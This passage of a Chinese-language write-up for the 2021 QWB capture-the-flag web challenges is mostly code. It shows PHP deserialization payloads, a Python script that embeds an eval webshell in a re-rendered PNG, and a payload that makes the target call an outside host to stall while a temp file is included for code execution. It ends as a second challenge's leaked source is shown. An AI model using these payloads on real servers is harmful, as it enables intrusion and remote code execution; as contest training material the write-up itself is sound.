<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger the include of myclass.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$triggerHello</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;triggerHello = <span class="keyword">new</span> Hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwb</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;qwb = <span class="string">&quot;e2a7106f1cc8bb1e1318df70aa0a3540.php&quot;</span>; <span class="comment">// read file</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> substr(urlencode(serialize(<span class="keyword">new</span> myclass())), <span class="number">0</span>, -<span class="number">6</span>);</span><br></pre></td></tr></table></figure>

<p>脚本将生成的序列化字符串的最后两个 <code>&#125;</code> ，此时序列化会成功读取文件，但是最终会失败，从而绕过了后面的正则。读取到了如下文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;bff139fa05ac583f685a523ab3d110a0.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;45b963397aa40d4a0063e0d85e4fe7a1.php&quot;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;119ef9cf-b19b-4bff-90ea-c6bb9b30b2ce&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;119ef9cf-b19b-4bff-90ea-c6bb9b30b2ce&#x27;</span>]:<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = preg_match(<span class="string">&quot;/tmp/i&quot;</span>,<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$flag</span>)&#123;</span><br><span class="line">    PNG(<span class="variable">$file</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$res</span> = @scandir(<span class="variable">$_GET</span>[<span class="string">&#x27;00b5e1f9-4831-4af6-bd3c-2472bdcf7d5b&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;00b5e1f9-4831-4af6-bd3c-2472bdcf7d5b&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;00b5e1f9-4831-4af6-bd3c-2472bdcf7d5b&#x27;</span>]===<span class="string">&#x27;/tmp&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$somthing</span> = GenFiles();</span><br><span class="line">    <span class="variable">$res</span> = array_merge(<span class="variable">$res</span>,<span class="variable">$somthing</span>);</span><br><span class="line">&#125;</span><br><span class="line">shuffle(<span class="variable">$res</span>);</span><br><span class="line">@print_r(<span class="variable">$res</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>很容易发现其有列出目录的功能。除此之外可以以同样的方式将其中 include 的文件读出。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//bff139fa05ac583f685a523ab3d110a0.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PNG</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!is_file(<span class="variable">$file</span>))&#123;<span class="keyword">die</span>(<span class="string">&quot;我从来没有见过侬&quot;</span>);&#125;</span><br><span class="line">    <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$first</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;发现了奇怪的东西2333&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">    unlink(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        imagepng(<span class="variable">$second</span>, <span class="variable">$file</span>);</span><br><span class="line">        imagedestroy(<span class="variable">$second</span>);<span class="comment">//销毁，清内存</span></span><br><span class="line">    &#125;</span><br><span class="line">    imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//45b963397aa40d4a0063e0d85e4fe7a1.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GenFiles</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    <span class="variable">$len</span>=strlen(<span class="variable">$str</span>)-<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="string">&quot;php&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="number">6</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$filename</span>  .= <span class="variable">$str</span>[rand(<span class="number">0</span>,<span class="variable">$len</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// file_put_contents(&#x27;/tmp/&#x27;.$filename,&#x27;flag&#123;fake_flag&#125;&#x27;);</span></span><br><span class="line">        <span class="variable">$files</span>[] = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$files</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以发现其中 <code>PNG</code> 函数对传入的文件进行了重渲染操作。<code>/tmp</code> 下的文件将被传给 <code>PNG</code> 重渲染后直接包含。<code>GenFiles</code> 则是生成假的文件字符串来混淆视听，由于是强等于的判断 <code>===&#39;/tmp&#39;</code>，直接用 <code>/tmp/</code> 即可绕过这个函数的执行。而二次渲染的图片马可以借由 <code>PNG-IDAT-Payload-Generator</code> 写出如下脚本来生成。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">PAYLOAD_LENGTH = <span class="number">20</span></span><br><span class="line"><span class="comment"># PAYLOAD = &quot;(\&quot;PHP\&quot;.\&quot;INFO\&quot;)()&quot;</span></span><br><span class="line">PAYLOAD = <span class="string">&quot;EVAL($_POST[\&quot;ZIT\&quot;])&quot;</span></span><br><span class="line">DEFAULT_COMPRESSED_STRING = <span class="string">b&quot;\xa3\x9f\x67\x54\x6f\x2c\x24\x15\x2b\x11\x67\x12\x54\x6f\x11\x2e\x29\x15\x2b\x21\x67\x22\x6b\x6f\x5f\x53\x10&quot;</span></span><br><span class="line">ENV = <span class="string">&quot;http://QUESTION_HOST_HERE/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RawDeflate</span>(<span class="params">data, compresslevel=<span class="number">9</span></span>):</span></span><br><span class="line">    compress = zlib.compressobj(</span><br><span class="line">        compresslevel,  <span class="comment"># level: 0-9</span></span><br><span class="line">        zlib.DEFLATED,  <span class="comment"># method: must be DEFLATED</span></span><br><span class="line">        -zlib.MAX_WBITS,  <span class="comment"># window size in bits:</span></span><br><span class="line">        <span class="comment">#   -15..-8: negate, suppress header</span></span><br><span class="line">        <span class="comment">#   8..15: normal</span></span><br><span class="line">        <span class="comment">#   16..30: subtract 16, gzip header</span></span><br><span class="line">        zlib.DEF_MEM_LEVEL,  <span class="comment"># mem level: 1..8/9</span></span><br><span class="line">        <span class="number">0</span>  <span class="comment"># strategy:</span></span><br><span class="line">        <span class="comment">#   0 = Z_DEFAULT_STRATEGY</span></span><br><span class="line">        <span class="comment">#   1 = Z_FILTERED</span></span><br><span class="line">        <span class="comment">#   2 = Z_HUFFMAN_ONLY</span></span><br><span class="line">        <span class="comment">#   3 = Z_RLE</span></span><br><span class="line">        <span class="comment">#   4 = Z_FIXED</span></span><br><span class="line">    )</span><br><span class="line">    deflated = compress.compress(data)</span><br><span class="line">    deflated += compress.flush()</span><br><span class="line">    <span class="keyword">return</span> deflated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RawInflate</span>(<span class="params">data</span>):</span></span><br><span class="line">    decompress = zlib.decompressobj(-zlib.MAX_WBITS)</span><br><span class="line">    inflated = decompress.decompress(data)</span><br><span class="line">    inflated += decompress.flush()</span><br><span class="line">    <span class="keyword">return</span> inflated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate payload</span></span><br><span class="line">payload = (PAYLOAD + <span class="string">&quot;&#123;&#125;&quot;</span>).<span class="built_in">format</span>(<span class="string">&quot; &quot;</span> * <span class="built_in">int</span>(PAYLOAD_LENGTH - (<span class="built_in">len</span>(PAYLOAD)))).encode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Using payload ~&#123;&#125;~&quot;</span>.<span class="built_in">format</span>(payload))</span><br><span class="line">payloadWrapped = codecs.encode(</span><br><span class="line">    RawInflate(RawDeflate(DEFAULT_COMPRESSED_STRING).replace(<span class="string">b&quot;$_GET[0]($_POST[1]);&quot;</span>, payload)), <span class="string">&quot;hex_codec&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated wrapped payload &#123;&#125;&quot;</span>.<span class="built_in">format</span>(payloadWrapped))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate image</span></span><br><span class="line">evilImage = <span class="string">&quot;./evilImage.png&quot;</span></span><br><span class="line">filterProof = bypass_filters(payloadWrapped)</span><br><span class="line">save_image(filterProof, evilImage)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated Image &#123;&#125;&quot;</span>.<span class="built_in">format</span>(evilImage))</span><br><span class="line">verify(evilImage, payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Fin&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>此时整个包含临时文件 RCE 的路径就完整了，但是临时文件要想办法留存更久。因此考虑使用 <code>file_get_contents($this-&gt;qwb);</code> 来阻塞进程，即在自己的服务器上给出如下代码，使得程序的请求强制停留等待，即给临时文件包含提供了时间。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    sleep(<span class="number">2147483647</span>);</span><br></pre></td></tr></table></figure>

<p>写出如下载荷来达成阻塞的目的，同时以 POST 的方式将生成的恶意文件上传。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// trigger the include of myclass.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$triggerHello</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;triggerHello = <span class="keyword">new</span> Hello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwb</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;qwb = <span class="string">&quot;http://8.136.8.210:3255&quot;</span>; <span class="comment">// force sleep 2147483647</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> substr(urlencode(serialize(<span class="keyword">new</span> myclass())), <span class="number">0</span>, -<span class="number">6</span>);</span><br></pre></td></tr></table></figure>

<p>上传文件后使用 <code>e2a7106f1cc8bb1e1318df70aa0a3540.php</code> 列出 <code>/tmp</code> 下的文件，再发送请求将其包含后执行指令。</p>
<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/637868f2-f496-4f22-ba60-c136d74b7e4c/1623633738014/988c7ff307e04bdbc84a0cb0bd53610d521b78ab.png" alt="image-20210614092215747"></p>
<p>在 <code>/l1b</code> 下可以找到疑似 flag 的文件，但是无法读出，猜测需要一个 readflag，可以找到有 <code>/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG</code> 文件，将其作 readflag 使用，构造 <code>/usr/bin/ed471efd0577be6357bb94d6R3@dF1aG /l1b/06cb199b/1ea50a20/8d8880fa/eaf8f8a5/c7769282/Fl444gggb08c9817</code> 即可以得到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e9f76b6f-46c5-477e-b7ec-f5f03df1f74a&#125;</span><br></pre></td></tr></table></figure>

<h3 id="强网先锋-赌徒"><a href="#强网先锋-赌徒" class="headerlink" title="[强网先锋]赌徒"></a>[强网先锋]赌徒</h3><p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 有源码泄露，可以得到如下源码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//hint is in hint.php</span></span><br><span class="line">error_reporting(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>=<span class="string">&#x27;syst3m(&quot;cat 127.0.0.1/etc/hint&quot;);&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;I think you need /etc/hint . Before this you need to see the source code&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_sayhello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hi&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sayhello();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$cc</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;give you flag : &quot;</span>.<span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phonenumber</span>=<span class="number">123123</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$promise</span>=<span class="string">&#x27;I do&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;promise=<span class="string">&#x27;I will not !!!!&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;promise;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file[<span class="string">&#x27;filename&#x27;</span>]-&gt;ffiillee[<span class="string">&#x27;ffiilleennaammee&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Room</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth_to_set</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_hint</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$hint</span>=base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="keyword">$this</span>-&gt;Get_hint(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]))&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$hi</span> = <span class="keyword">new</span>  Start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造如下脚本生成序列化字符串载荷。</p>
